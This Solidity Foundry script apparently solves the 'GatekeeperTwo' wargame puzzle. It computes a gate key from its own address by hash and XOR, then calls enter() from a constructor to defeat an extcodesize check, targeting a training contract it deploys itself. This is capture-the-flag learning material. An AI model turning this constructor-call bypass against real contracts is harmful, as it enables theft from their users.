// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AttackGatekeeperTwo {
    function calculateGateKey(address _addr) public pure returns (bytes8) {
        return bytes8(uint64(bytes8(keccak256(abi.encodePacked(_addr)))) ^ type(uint64).max);
    }

    constructor() {
        bytes8 gateKey = calculateGateKey(address(this));
        GatekeeperTwo gatekeeperTwo = new GatekeeperTwo();
        gatekeeperTwo.enter(gateKey);
    }
}

contract DeployGatekeeperTwo is Script {
    function run() public {
        new AttackGatekeeperTwo();
    }

}